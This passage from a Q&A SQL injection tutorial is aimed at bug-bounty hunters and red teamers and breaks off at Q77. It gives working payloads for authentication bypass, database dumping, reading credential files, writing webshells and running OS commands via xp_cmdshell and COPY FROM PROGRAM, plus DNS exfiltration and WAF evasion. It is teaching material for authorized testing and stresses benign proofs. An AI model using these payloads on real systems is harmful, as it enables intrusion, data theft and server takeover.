# SQL Injection — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **SQL injection** — from "what is it" to RCE on the DB host,
> authentication bypass, full database dump, file read/write, blind char-by-char extraction, out-of-band exfiltration,
> stacked queries, second-order, per-DBMS deep dives, WAF evasion, tooling, methodology, real-world cases, **and**
> defense. Q&A format, progressive difficulty. Covers the five technique families (error / UNION / boolean / time /
> OOB), the three injection contexts (string / numeric / identifier), and all five major engines (MySQL/MariaDB,
> PostgreSQL, MSSQL, Oracle, SQLite).
>
> ⚖️ **Authorized use only.** Everything here is for bug bounty (in-scope), sanctioned pentests, CTFs, and learning.
> Prove the query changed with **benign proof** (`version()` + one row), don't mass-dump real PII, **never run
> destructive writes** (DROP/DELETE/table-wide UPDATE), don't DoS, **clean up**, and never test systems you don't have
> written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *SQL injection* (+ the SQLi cheat sheet + labs)
- OWASP — *SQL Injection* + WSTG "Testing for SQL Injection" (WSTG-INPV-05) + *SQL Injection Prevention Cheat Sheet*
- HackTricks — *SQL injection* (and the per-DBMS pages)
- PayloadsAllTheThings — *SQL Injection*
- sqlmap documentation (sqlmap.org)
- CWE-89 (SQL Injection), CWE-74 (Injection), CWE-287 (auth bypass), CWE-78 (OS command, when SQLi → RCE)
- Companion kit in this repo: `Web/SQLi/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q9)
- **Level 1 — Finding & confirming injection** (Q10–Q20)
- **Level 2 — Contexts, breakout & the five technique families** (Q21–Q34)
- **Level 3 — Per-DBMS exploitation** (Q35–Q46)
- **Level 4 — Auth bypass, dump, file R/W & RCE** (Q47–Q62)
- **Level 5 — Blind extraction, OOB, stacked & second-order** (Q63–Q74)
- **Level 6 — WAF/filter/ORM evasion & advanced** (Q75–Q82)
- **Tooling** (Q83–Q87)
- **Black-box methodology & checklist** (Q88–Q91)
- **Severity, validity & false positives** (Q92–Q96)
- **Cheat sheets** (Q97–Q100)
- **Real-world patterns & references** (Q101–Q103)
- **Defense — preventing SQL injection** (Q104–Q110)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is SQL injection?
A flaw where user input is incorporated into a SQL statement **as code rather than data** — the application string-builds the query instead of using a **parameterized query / prepared statement**. By injecting SQL syntax, the attacker changes what the query does: read other rows/tables, make a condition always-true (auth bypass), call DBMS functions (read files, sleep, run OS commands), or append extra statements. It is **CWE-89**, the canonical member of the injection family (CWE-74).

### Q2. Why is SQLi considered the "flagship" web vulnerability?
Because its impact ceiling is the highest of the common web bugs. A single injectable parameter can yield: a full database dump (credentials, PII, secrets), **authentication bypass → admin takeover**, arbitrary **file read** and **file write** on the server, and — with a privileged DB account on MSSQL/PostgreSQL/MySQL — **remote code execution on the database host**. Few other web bugs chain from one request to total server compromise.

### Q3. How is SQLi different from command injection, LDAP injection, SSTI, NoSQLi?
All are "untrusted input in an interpreter," but the interpreter differs. **SQLi** targets a SQL database (read/write data, sometimes RCE via DB features). **Command injection** runs OS commands directly (`;id;`). **LDAP injection** edits a directory filter (auth/authz, no RCE). **SSTI** abuses a template engine (`${7*7}`→49, often RCE). **NoSQL injection** abuses document-store operators (`$ne`, `$gt`, `$where`). Same mindset, different syntax and ceiling — route each to its own kit.

### Q4. What are the five technique families?
1. **Error-based** — the DB error is shown; extract data *inside* the error message.
2. **UNION-based** — append `UNION SELECT` to pull other tables into the reflected result set.
3. **Boolean-based blind** — no data/no error, but TRUE vs FALSE conditions give different responses → infer bit by bit.
4. **Time-based blind** — no visible difference at all, but you can make the DB `SLEEP` on a condition → infer by delay.
5. **Out-of-band (OOB)** — no in-band channel; force the DB to make a DNS/HTTP request carrying the data to you.
(Plus **stacked queries**: append `; <statement>` for INSERT/UPDATE/EXEC — driver-dependent.)

### Q5. What are the three injection contexts, and why do they matter?
- **String** (`…name='INPUT'`): break out with a quote (`'`), then comment or balance.
- **Numeric** (`…id=INPUT`): no quote to close — inject directly (`1 OR 1=1`, `1 AND SLEEP(5)`).
- **Identifier** (`…ORDER BY INPUT` / column/table name): quotes don't help; use a column index, a `CASE`, or a subquery.
The context decides the break-out. A string payload does nothing in a numeric slot, and **no** quote payload works in an identifier slot — getting the context right *before* spraying is the single biggest time-saver.

### Q6. Why must I fingerprint the DBMS, and how?
Because every exploitation primitive is dialect-specific: `@@version` vs `version()` vs `banner`; `CONCAT` vs `||` vs `+`; `SLEEP()` vs `pg_sleep()` vs `WAITFOR DELAY` vs `dbms_pipe.receive_message`. Fingerprint from **error text** (MySQL "check the manual", MSSQL "Unclosed quotation mark", Oracle "ORA-#####", PG "syntax error at or near"), from **which concat/sleep works**, and from behavior (Oracle needs `FROM dual`). Get the engine right and the whole arsenal becomes copy-paste.

### Q7. What's the single most important mindset?
**Prove the database did something different because of your input — not that a character was reflected or that you got a 500.** The bug exists only when the *query* behaves differently: other rows returned, a TRUE/FALSE branch, a controlled time delay, a UNION value on the page, a value leaked via error, or an OOB callback. A reflected SQL error is, at most, a lead.

### Q8. Why is "I got a 500 / a SQL error" not automatically a finding?
A crash or a verbose error proves your input *reached* the query, but not that you can *control* it. Triagers reject "the page errors on a quote" without a demonstrated query change. A verbose error is at best a low-severity information leak; turn it into error-based extraction or pivot to boolean/UNION/time to make it a real SQLi.

### Q9. Minimum prerequisites before testing?
HTTP fundamentals + an intercepting proxy (Burp/Caido), the SQL syntax for at least one engine, the ability to send raw requests (curl/Python) to place payloads in params/body/JSON/headers, and — for confirmation/exploitation — `sqlmap` and an OOB endpoint (Burp Collaborator) in Kali/WSL. Knowing the per-DBMS function table (Appendix C of the guide) saves enormous guessing.

---

# LEVEL 1 — FINDING & CONFIRMING INJECTION

### Q10. How do I find SQL sinks (recon)?
Test **every** input that can reach SQL: URL params (`?id`, `?sort`, `?search`, `?category`, `?page`), POST/form fields, **JSON keys** (incl. nested), cookies, and the **headers apps log** (`User-Agent`, `Referer`, `X-Forwarded-For`). Prioritize **login**, **search/filter**, **`?sort=`/`?order=`** (identifier context), **pagination**, and **report/export** builders. Grep source/JS for string-built SQL (`execute("..."+x)`, `query(\`...${x}\`)`, `knex.raw`, `order(params[:sort])`). Flag any value **stored then reused** (second-order).

### Q11. What's the very first test against a suspected sink?
Baseline a normal value, then probe:
1. `id=1'` → SQL error / 500 / different page? → string break or error-based.
2. `id=2-1` → returns the `id=1` row? → **numeric** context (arithmetic evaluated) and injectable.
3. `id=1 AND 1=1` vs `id=1 AND 1=2` → different responses? → **boolean** oracle.
4. `id=1 AND SLEEP(5)` → ~5s delay? → **time** blind (and MySQL).
5. `id=1' ORDER BY 1-- -` climbing → errors at N ⇒ column count for **UNION**.

### Q12. Why is "my quote didn't error" not proof of safety?
Errors are usually suppressed in production, and **numeric** injection often throws no error at all. The decisive tests are **boolean** (`AND 1=1` vs `AND 1=2` give different pages), **time** (`AND SLEEP(5)` delays), and the **arithmetic** test (`2-1`→row 1). Silence almost always means *blind*, not safe.

### Q13. How do I tell string vs numeric context quickly?
- **Numeric:** `id=2-1` returns the `id=1` row (math ran), and `id=1'` may not error.
- **String:** `id=1'` errors, but `id=1'-- -` or `id=1' OR '1'='1` fixes it; confirm with `' AND '1'='1` (true) vs `' AND '1'='2` (false).
If neither (the value names a column), it's **identifier** context — use index/`CASE`/subquery (Q26).

### Q14. What is the arithmetic test and why is it elegant?
For a numeric parameter, send `id=2-1` (or `id=3-2`). If you get the **same row as `id=1`**, the database evaluated the subtraction server-side — proving your input is parsed as SQL, not treated as the literal string "2-1". It's a clean, low-noise confirmation of numeric injection that throws no error and dumps no data.

### Q15. What is error-based SQLi and what does the error give me?
When the DB error is shown, you can (a) **fingerprint** the engine and (b) **extract data into the error** using functions that embed a subquery's result in the error text — MySQL `extractvalue/updatexml`, MSSQL `CONVERT(int,(subquery))`, PostgreSQL `CAST(... AS int)`, Oracle `UTL_INADDR`/`CTXSYS.DRITHSX.SN`. A single `extractvalue(1,concat(0x7e,(SELECT @@version)))` returns the version inside an "XPATH syntax error" — clean, decisive proof.

### Q16. No data appears anywhere — what now?
You're blind. Build a **boolean oracle** (`AND 1=1` vs `AND 1=2` → different responses) and read data char-by-char; if there's no visible difference at all, use **time** (`SLEEP`/`pg_sleep`/`WAITFOR`); if even time is unreliable or egress-only, go **OOB** (force a DNS callback). Blind is the *common* case on modern apps — never conclude "safe" from "no data."

### Q17. What benign proof confirms SQLi for a report?
A **controlled query change**: `id=1 AND 1=1` (row shows) vs `id=1 AND 1=2` (row gone); or `UNION SELECT @@version,NULL` returns the version; or `AND SLEEP(5)` delays while `SLEEP(0)` doesn't (repeatably); or an OOB DNS hit carrying `database()`; or `admin'-- -` logs you in. The proof is the *change in the query's behavior*, demonstrated with **benign** values.

### Q18. Reflected error vs altered query — the rule.
| You have | Verdict |
|---|---|
| `'` causes a 500 / SQL error | Lead only — prove the query changed |
| `AND 1=1` vs `AND 1=2` differ | Boolean SQLi |
| `SLEEP(5)` delays, `SLEEP(0)` doesn't | Time SQLi |
| `UNION SELECT @@version` shows version | UNION SQLi → read |
| `xp_cmdshell 'whoami'` returns output | RCE |

### Q19. How do I avoid false positives on a "slow" endpoint?
"Slow" ≠ time-based. Require a **controlled** delay: the `SLEEP(5)` payload delays ~5s while the identical request with `SLEEP(0)` returns fast, and it reproduces across several retries. Vary the delay (3s, then 7s) and confirm the response time tracks it. Random slowness that doesn't track your sleep value is just a slow endpoint.

### Q20. Where do hunters most often miss SQLi?
(1) **Identifier context** (`?sort=`/`?order=`) — they try `'`, get nothing, and leave, missing that the sort column is concatenated raw. (2) **Headers logged to audit tables** — unauthenticated second-order INSERT sinks. (3) **Second-order** — input parameterized on insert but string-built by a later admin/report query. (4) **Blind** — they expect echoed data and don't build a boolean/time oracle.

---

# LEVEL 2 — CONTEXTS, BREAKOUT & THE FIVE TECHNIQUE FAMILIES

### Q21. How do I break out of a string context cleanly?
Close the quote, inject, then neutralize the trailing SQL — either **comment it out** (`'-- -` with a trailing space, `'#` on MySQL, `'/*`) or **balance** it (`' OR '1'='1` leaves the app's closing quote valid, no comment needed). Prove logic with `' OR '1'='1` (widens) vs `' AND '1'='2` (empties).

### Q22. What if the value is wrapped in parentheses or a function?
The error usually echoes the broken fragment. Close the extra parens: `')-- -`, `'))-- -`, `') OR ('1'='1`. A value inside `func('INPUT')` (e.g. `LOWER('INPUT')`) needs you to close both the quote and the paren before injecting.

### Q23. How do comments differ across engines, and why care?
`-- ` (double-dash + a space/char) works everywhere; MySQL also supports `#` and `/*…*/`, plus the **version-gated** `/*!50000…*/` that *executes* on MySQL only (great for fingerprinting and evasion). The trailing space after `--` matters in MySQL (`-- -` is the safe form). Picking the right comment lets you cleanly truncate the rest of the query.

### Q24. What's the UNION prerequisite and how do I satisfy it?
`UNION SELECT` requires (1) the **same column count** as the original SELECT and (2) **compatible column types**. Find the count with `ORDER BY 1,2,3,…` (first N that errors ⇒ count N-1) or `UNION SELECT NULL,NULL,…` (NULL is type-agnostic, isolating the count). Then find a **string-typed, visible** column by rotating a marker (`'a'`) through the positions.

### Q25. How do I pull lots of data through one visible column?
Concatenate. Put multiple values into the single visible string column: MySQL `CONCAT(user,0x3a,password)`, PG/Oracle/SQLite `user||':'||password`, MSSQL `user+':'+password`. To pull a whole column in one cell, aggregate: MySQL `GROUP_CONCAT`, PG `string_agg`, Oracle `LISTAGG`, SQLite `group_concat`.

### Q26. How do I exploit an `ORDER BY` / identifier context with no quotes?
Three routes: (1) **Column index** — `?sort=1` vs `?sort=2` reorder differently (and brute the count). (2) **Boolean via CASE** — `?sort=(CASE WHEN (1=1) THEN name ELSE id END)` gives ordering A vs B → a quote-free boolean oracle. (3) **Time via subquery** (MySQL) — `?sort=(SELECT 1 FROM (SELECT SLEEP(5))x)`. The direction slot (`ASC`/`DESC`) is sometimes injectable too.

### Q27. How does boolean-based blind extraction work?
You have a 1-bit oracle (TRUE vs FALSE → different response). Read a value char-by-char: `SUBSTRING(value,pos,1)='x'`, or faster, `ASCII(SUBSTRING(value,pos,1))>mid` and **binary-search** the ASCII code (~7 requests/char instead of ~95). Get the length first (`LENGTH(value)>N`, binary-searched) so you know when to stop.

### Q28. How does time-based blind work when there's no visible difference?
Make the query **pause** on a condition and read the answer from the response time: `IF(<condition>,SLEEP(5),0)` (MySQL), `CASE WHEN <cond> THEN pg_sleep(5) ELSE 1 END` (PG), `IF (<cond>) WAITFOR DELAY '0:0:5'` (MSSQL), `CASE WHEN <cond> THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END` (Oracle). Delayed ⇒ condition true. Slowest channel, but it works whenever the query runs.

### Q29. When and why use out-of-band (OOB)?
When there's no in-band channel (no error, no reflection, no boolean diff) and time-blind is too slow/unstable — or just as a *fast confirmation*. Force the DB to resolve a hostname you control with the stolen data as a subdomain: MSSQL `xp_dirtree '\\…\x'`, Oracle `UTL_INADDR.GET_HOST_ADDRESS`/`DBMS_LDAP`, PostgreSQL `COPY…TO PROGRAM 'nslookup …'`, MySQL `LOAD_FILE('\\\\…')` on Windows. A single DNS hit carrying `database()` is irrefutable.

### Q30. What are stacked queries and which engines allow them?
Terminating the first statement with `;` and appending a **second arbitrary statement** (`'; UPDATE … ; --`). Commonly allowed on **PostgreSQL** (libpq) and **MSSQL** (most drivers), sometimes SQLite; usually **not** via MySQL's `mysqli_query` (though PDO with emulated prepares can). Stacked queries unlock `INSERT`/`UPDATE`/`EXEC`/`xp_cmdshell`/`COPY…FROM PROGRAM` — the write/RCE gateway.

### Q31. How do I test for stacked-query support safely?
Append a **read-only** delay as the second statement: `'; SELECT pg_sleep(5)-- -` or `'; WAITFOR DELAY '0:0:5'-- -`. A delay proves the second statement executed — without writing anything. Only then consider a write, and **scope it to your own test row** (Q60).

### Q32. Which technique should I prefer, and in what order?
Use the **most reliable observable** the target gives you, roughly: **in-band (error / UNION)** > **boolean** > **time** > **OOB**. In-band is fastest and cleanest; boolean is reliable but char-by-char; time is universal but slow and loud; OOB needs egress and external infra. You only need **one** to win — pick the cheapest the target offers.

### Q33. What is second-order SQL injection?
Your input is **stored** safely (parameterized insert), then later **concatenated** into a query by a *different* feature (an admin search, a report/export job, a stats recompute) that trusts stored data. The vulnerable query is in the **consumer**, often running at **higher privilege**. Classic: registration parameterizes the insert, but the password-reset/admin query string-builds with the stored username.

### Q34. How do I detect second-order without seeing the query?
Plant a payload that **survives storage** and fires later — a **time** or **OOB** payload is ideal (`displayName = a'||(SELECT pg_sleep(5))||'`). Then trigger every feature that reads the stored value (view profile in admin, run a report, an export) and watch for the delay/callback. Because the sink is elsewhere, you confirm it by the *consumer's* behavior.

---

# LEVEL 3 — PER-DBMS EXPLOITATION

### Q35. MySQL/MariaDB — the essentials?
Version `@@version`/`VERSION()`; concat needs `CONCAT()` (no `||` unless `PIPES_AS_CONCAT`); comments `-- -`, `#`, `/*!…*/`; time `SLEEP()`; error-based `extractvalue`/`updatexml`/`floor()`; schema `information_schema.{schemata,tables,columns}`; file read `LOAD_FILE()`, write `INTO OUTFILE/DUMPFILE` (FILE priv + `secure_file_priv`); RCE via UDF (high bar) — usually file-write→webshell instead. Stacked queries usually **not** via mysqli.

### Q36. PostgreSQL — the essentials?
Version `version()`; concat `||`; casts `::int`; comments `--`, `/*…*/`; time `pg_sleep()`; error-based via `CAST(text AS int)`; schema `information_schema.*` + `pg_catalog` (`pg_shadow` for hashes if superuser); **stacked queries YES**; file `pg_read_file()`/`COPY FROM`, write `COPY (…) TO`; **RCE via `COPY … FROM PROGRAM 'cmd'`** (superuser, ≥9.3, CVE-2019-9193) or untrusted PL/Python. The most RCE-friendly engine after MSSQL.

### Q37. Microsoft SQL Server — the essentials?
Version `@@version`; concat `+`; comments `--`, `/*…*/`; time `WAITFOR DELAY '0:0:5'`; error-based via `CONVERT(int,(subquery))`; schema `information_schema.*` + `sys.*`; **stacked queries YES**; OOB via `xp_dirtree`/`xp_fileexist` (DNS/SMB); **RCE via `xp_cmdshell`** (enable with `sp_configure`), `sp_OACreate` (OLE), CLR, Agent jobs; **lateral via linked servers** (`OPENQUERY`, `EXECUTE … AT`). The richest post-exploitation engine.

### Q38. Oracle — the essentials and quirks?
Version `SELECT banner FROM v$version`; **every SELECT needs `FROM dual`**; concat `||`; identifiers are **UPPER-case** by default; comments `--`, `/*…*/`; time `DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)` (or `DBMS_LOCK.SLEEP` if granted); OOB/error via `UTL_INADDR`/`UTL_HTTP`/`DBMS_LDAP`/`CTXSYS.DRITHSX.SN`; schema `all_tables`/`all_tab_columns`; file via `UTL_FILE`; RCE via `DBMS_SCHEDULER`/Java stored proc (privilege-dependent).

### Q39. SQLite — the essentials and limits?
Version `sqlite_version()`; concat `||`; comments `--`, `/*…*/`; **no native sleep** (prefer boolean/OOB); schema from **`sqlite_master`** (`type`,`name`,`sql` — table/column names live in the stored `CREATE` statements); **no native file read/write or RCE** (ATTACH/load_extension usually disabled). Common in mobile and small web apps — lower server ceiling but full DB read is still possible.

### Q40. How do I enumerate the schema generically?
`information_schema` on MySQL/PG/MSSQL: databases `schema_name FROM information_schema.schemata`; tables `table_name FROM information_schema.tables WHERE table_schema=database()`; columns `column_name FROM information_schema.columns WHERE table_name='users'`. Oracle uses `all_tables`/`all_tab_columns` (UPPER-case). SQLite uses `sqlite_master`. MSSQL also has native `sys.databases`/`sys.tables`/`sys.columns`.

### Q41. Where do credentials usually live, and what do I do with them?
Tables named `users`/`accounts`/`members`/`admin`/`auth`, columns `password`/`password_hash`/`passwd`. Once you confirm they're **readable**, that *raises severity* (note it) — but for the PoC you don't dump them all; extract **one** (ideally your own test row) or just prove the column exists and is readable. In an authorized red-team, dumped hashes feed offline cracking → credential reuse.

### Q42. How do I read files via SQLi?
MySQL `LOAD_FILE('/etc/passwd')` (FILE priv + permissive `secure_file_priv`); PostgreSQL `pg_read_file()` or `COPY t FROM '/path'` (superuser); MSSQL `OPENROWSET(BULK '/path', SINGLE_CLOB)` (ADMINISTER BULK OPS); Oracle `UTL_FILE`/external tables. High-value targets: `.env`, `wp-config.php`, `settings.py`, `web.config`, `pg_hba.conf`, `~/.aws/credentials`, and app **source code** (for more bugs). Prove with a benign file.

### Q43. How do I write a file / webshell via SQLi?
MySQL `… INTO OUTFILE '/var/www/html/s.php'` (or `INTO DUMPFILE` for exact bytes) with FILE priv, permissive `secure_file_priv`, and a known web-served path; PostgreSQL `COPY (SELECT '<?php …?>') TO '/var/www/html/s.php'` (superuser). All prerequisites must hold (write priv + known webroot + web-served + file funcs on). For a bounty, write a **benign marker** and fetch it over HTTP — that proves write+serve without dropping a live shell.

### Q44. How does SQLi become RCE on MSSQL?
`xp_cmdshell`: enable it (`sp_configure 'show advanced options',1; RECONFIGURE; sp_configure 'xp_cmdshell',1; RECONFIGURE;`) if you're `sysadmin`, then `EXEC master..xp_cmdshell 'whoami'`. Output isn't returned inline — capture it via a temp table you then `SELECT`, or **OOB**. Alternatives: `sp_OACreate` (OLE automation), CLR assemblies, SQL Agent jobs, or `xp_cmdshell` on a **linked server**.

### Q45. How does SQLi become RCE on PostgreSQL / MySQL?
**PostgreSQL:** `COPY cmd FROM PROGRAM 'id'` (superuser, ≥9.3; CVE-2019-9193) — create a table, COPY the command output into it, SELECT it back; or untrusted PL/Python/PL/Perl. **MySQL:** UDF (`lib_mysqludf_sys`) — write the shared library via `INTO DUMPFILE` into the plugin dir, `CREATE FUNCTION sys_exec … SONAME …`, then `SELECT sys_exec('id')`. The MySQL UDF path is a high bar; file-write→webshell is usually easier.

### Q46. What is linked-server lateral movement (MSSQL)?
MSSQL servers often define **linked servers** (other DB instances). With access you can run queries on them: `SELECT * FROM OPENQUERY([LINKEDSRV],'SELECT @@version')`, or execute (including `xp_cmdshell`) remotely: `EXECUTE('xp_cmdshell ''whoami''') AT [LINKEDSRV]`. A single injectable MSSQL front-end can thus reach **other databases and hosts** — document the capability; only pivot if scope covers those systems.

---

# LEVEL 4 — AUTH BYPASS, DUMP, FILE R/W & RCE

### Q47. How does SQLi bypass authentication?
A login that builds `SELECT * FROM users WHERE user='$u' AND pass='$p'` and treats "row returned" as success is bypassable: comment out the password (`admin'-- -`), or force the WHERE true (`' OR '1'='1'-- -`, `' OR 1=1 LIMIT 1-- -`). You land on a user row without the real password — often the first/admin row.

### Q48. How do I land on the admin specifically?
Target the username in the WHERE: `admin'-- -` (comment the password check) or `admin' AND '1'='1'-- -`. If you only get "the first row," `' OR 1=1 LIMIT 1` frequently lands on the first/admin account anyway. Note exactly which account you authenticate as — admin → **Critical**, normal user → High.

### Q49. What does the schema→dump workflow look like end-to-end?
Find a channel (UNION/error/boolean/time) → enumerate **databases → tables → columns** via `information_schema`/`sqlite_master`/`all_tables` → pull rows from the interesting table (concatenate into the visible column for UNION, or binary-search for blind). For the report you **stop at proof** — `version()`, `current_user`, `COUNT(*)`, and **one** benign/own row.

### Q50. Why not just dump the whole `users` table to "prove impact"?
Because it adds legal/operational risk and **zero** bounty. `version()` + the table/column listing + one row already proves "arbitrary read of the database" — the same root cause and severity as a million rows. Mass-exfiltrating real PII/hashes can breach the program's rules and the law. Prove it, don't hoard it.

### Q51. What's the impact ranking I should escalate toward?
① **RCE on the DB host** (xp_cmdshell / COPY…FROM PROGRAM / UDF) — Critical → ② **auth bypass → admin (ATO)** — Critical → ③ **full DB read incl. hashes/PII/secrets** — High–Critical → ④ **file read** (config/source/`/etc/passwd`) — High → ⑤ **blind read** of sensitive data — High → then error-based-only leaks as a lead.

### Q52. How do I capture `xp_cmdshell` output when it isn't returned inline?
Two ways: (1) **temp table** — `INSERT INTO #t EXEC xp_cmdshell 'whoami'`, then read `#t` via your existing channel (UNION/error/blind); (2) **OOB** — encode the output into a DNS lookup: `xp_dirtree '\\'+(SELECT TOP 1 col FROM #t)+'.collab\x'`. For a one-line `whoami` proof, OOB is fast and clean.

### Q53. What proves file-read impact without exfiltrating secrets?
Read a **non-sensitive** file — `/etc/hostname` or `/etc/passwd` (conventional, low-risk) — and show its contents. That proves the FILE primitive works. Then *note* (don't dump) that sensitive targets (`.env`, key files) are reachable. The capability is the finding; you needn't steal the secret to prove you could.

### Q54. What proves RCE without "popping a shell"?
A single **benign** command — `whoami`, `id`, or `hostname` — and its one line of output. That unambiguously demonstrates arbitrary OS command execution. Do **not** add accounts, persist, drop a live/interactive shell, or run further commands on a bounty target. One `whoami` line = Critical; stop there.

### Q55. How do I prove auth bypass safely?
Use **your own test target/account** or land on the first row, and confirm only that you reached the **authenticated/admin page** (a benign signal — the dashboard loads, an admin-only menu appears). Do **not** browse a real user's data to "prove" it. Capture the request (`admin'-- -`) + the redirect/authenticated response + the control (`admin`/wrong-password → denied).

### Q56. Can SQLi cause integrity/availability damage, and should I demonstrate it?
Yes — stacked `UPDATE`/`DELETE`/`DROP` can corrupt or destroy data, and heavy queries can DoS. **Never demonstrate these destructively.** If you have stacked-write capability, prove it by updating **your own test row** (e.g. flip your own profile flag) or with a read-only `pg_sleep`. Destroying or DoSing real data is never an acceptable PoC and can be illegal.

### Q57. How do I handle SQLi in an INSERT/UPDATE statement?
In `INSERT INTO t VALUES('$a','$b')` you can inject inside a value (break the quote) and use a **sub-select** to leak data, or trigger an **error-based** extraction. In `UPDATE t SET x='$y' WHERE …` you can change *other* columns or sub-select — but be careful: a bad WHERE can update many rows. Prefer error/sub-select reads; scope any write to your own row.

### Q58. What's the deal with `secure_file_priv` (MySQL)?
It restricts where `LOAD_FILE`/`INTO OUTFILE` can read/write. If set to a directory, file ops only work there; if set to `NULL`, file ops are disabled; if empty, they work anywhere (FILE priv permitting). Read it: `SELECT @@secure_file_priv`. It's the gatekeeper for MySQL file read/write→webshell — check it before assuming file access.

### Q59. How do privileges gate exploitation?
Most high-impact primitives need elevated DB privileges: file read/write (FILE/superuser/ADMINISTER BULK), `xp_cmdshell`/`COPY…FROM PROGRAM` (sysadmin/superuser). Check first: MySQL `SELECT super_priv,file_priv FROM mysql.user WHERE user=current_user()`; PG `current_setting('is_superuser')`; MSSQL `IS_SRVROLEMEMBER('sysadmin')`; Oracle `SELECT * FROM session_privs`. A low-priv account may still dump readable data.

### Q60. What's the golden rule for stacked-query writes on production?
**Own-row only, never table-wide.** If you must demonstrate write capability, target a row you created/control (your own test account) and a benign column, then revert it. Never run an unscoped `UPDATE`/`DELETE` (no WHERE or a broad WHERE) or any `DROP`. When in doubt, prove write capability with a read-only delay (`WAITFOR`/`pg_sleep`) and describe the write impact rather than performing it.

### Q61. How do I chain SQLi into a broader compromise (red-team)?
SQLi → dump creds/hashes → offline crack → credential reuse → lateral. SQLi → file-read `.env`/config → cloud/DB creds → feed SSRF/recon. SQLi → `xp_cmdshell`/`COPY…FROM PROGRAM` → OS RCE → internal pivot. MSSQL linked servers → query/RCE on other hosts. Second-order → poison a stored field consumed by a higher-privilege admin job.

### Q62. When is SQLi *not* the highest-value bug on the endpoint?
When a cleaner, higher-impact bug shares the sink — e.g. the same parameter also yields unauthenticated **RCE via deserialization**, or the "SQLi" is actually a parameterized query and the real bug is **IDOR/auth** on the returned object. Always lead with the highest demonstrated impact and the correct root cause; don't misclassify.

---

# LEVEL 5 — BLIND EXTRACTION, OOB, STACKED & SECOND-ORDER

### Q63. How do I make blind extraction fast?
**Binary-search** each character's ASCII code with `>` comparisons (~7 requests/char vs ~95 linear), and binary-search the **length** first so you know when to stop. Prefer **boolean** over **time** when both exist (no fixed per-request delay). Parallelize cautiously (low concurrency) and reuse the connection (keep-alive). `poc/sqli_blind.py` implements the binary search for both modes.

### Q64. How do I build a reliable boolean oracle when the diff is subtle?
Find a stable signal: a specific marker string present/absent ("in stock"/"out of stock"), a length delta that **reproduces**, a status-code change, or a redirect. Confirm by re-requesting TRUE and FALSE a few times and checking the difference is **stable** (excludes caching/jitter). `sqli_fuzz.py` does this re-check before flagging a boolean candidate.

### Q65. What if the response is identical for TRUE and FALSE?
Switch to **time-based** — it needs no visible difference. If the app caches or normalizes responses (so even timing is masked at the edge), go **OOB**: the DNS callback fires from the *database*, bypassing the front-end entirely. Some targets only ever fall to time or OOB.

### Q66. How do I exfiltrate data over OOB efficiently?
Encode the value (or chunks) as **subdomains** of your Collaborator host and read the DNS log: `… (SELECT col)||'.abc.oastify.com' …`. For long values, chunk them (e.g. 30 chars per label, multiple lookups) and reassemble. OOB is far faster than time-blind because each request can carry many characters at once.

### Q67. Why is OOB sometimes the *only* channel?
Fully blind + heavily cached/normalized responses + an unreliable network make in-band and time channels useless, but if the DB host has **outbound DNS** (very common, even when HTTP egress is filtered), an OOB DNS callback still works. It also *proves egress*, which strengthens the report. The tradeoff: it needs external infra and reveals your listener.

### Q68. Are stacked queries required for RCE?
Not always. MSSQL `xp_cmdshell` and PG `COPY…FROM PROGRAM` are typically invoked via stacked queries, but you can sometimes reach exec primitives within a single statement context (sub-selects, functions) depending on the engine and the injection point. MySQL RCE (UDF/file-write) often doesn't need stacking at all (`INTO OUTFILE` rides a UNION). Test stacked support, but don't assume it's mandatory.

### Q69. How do I confirm second-order injection end-to-end?
(1) **Plant** a payload in a stored field during registration/profile edit — ideally a **time/OOB** payload that survives storage. (2) **Trigger** the consuming feature (admin user search, report/export, a sync/stats job). (3) **Observe** the delay/callback firing from the consumer. The two-step nature (store, then trigger) is what makes it easy to miss and easy to *prove* once you think of it.

### Q70. Why is second-order often higher impact?
Because the consuming query frequently runs with **higher privilege** than your session (an admin search, a backend report job, a DBA-owned stored procedure) and against more sensitive data. A stored payload that's harmless to *you* can dump or alter data when the privileged consumer executes it.

### Q71. How do I extract binary data (hashes, blobs) blindly?
Widen the charset/range in your binary search beyond printable ASCII (0–255), or hex-encode the value in the query (MySQL `HEX()`, PG `encode(col,'hex')`, MSSQL `master.sys.fn_varbintohexstr`) and extract the hex string (a clean `[0-9a-f]` charset). Hex avoids issues with non-printable bytes breaking your oracle.

### Q72. How do I deal with rate limits / lockouts during extraction?
Pace it (`--delay`, low concurrency), prefer **binary search** and **boolean/UNION** over time, and avoid the **login** path for blind grinding (failed-login counters lock accounts). For OOB, batch many chars per request. If the target is sensitive, extract only the **bounded proof** you need (length + a few chars) rather than the full value.

### Q73. What's a good "single request" proof for a fully-blind, firewalled target?
An **OOB** payload that resolves `<database()>.<your-collab>` — one request, one DNS hit carrying the DB name. It proves injection, the DBMS (by which OOB primitive worked), *and* egress, all at once, with no data hoarding. It's the cleanest blind PoC there is.

### Q74. How do I keep blind extraction low-noise (OPSEC)?
Jitter requests, keep concurrency low, reuse connections, prefer boolean/UNION over time (a time-blind dump can take hours and is extremely loud), minimize error-based probing (errors are logged/alerted), use a per-target Collaborator for OOB, and never grind against the login path. Extract only what proves the bug.

---

# LEVEL 6 — WAF/FILTER/ORM EVASION & ADVANCED

### Q75. The WAF blocks `UNION`/`SELECT` — how do I get past it?
Break the keyword with inline comments (`UN/**/ION`, `SE/**/LECT`), mixed case (`uNiOn`), MySQL versioned comments (`/*!50000UNION*/` which *executes*), or doubled keywords if it naively strips one (`UNIUNIONON`). Combine with whitespace and encoding tricks below. Apply one transform at a time and re-confirm the injection still fires.

### Q76. The WAF blocks spaces — alternatives?
Use comment-as-space `/**/`, the whitespace characters `%09 %0a %0b %0c %0d`, or parentheses to remove the need for spaces: `UNION(SELECT(1))`, `WHERE(1=1)`. MySQL tolerates tabs/newlines between tokens. In a URL, `+` also decodes to space (but encode literal `+` as `%2b`).

### Q77. The WAF blocks quotes — how do I build strings without them?
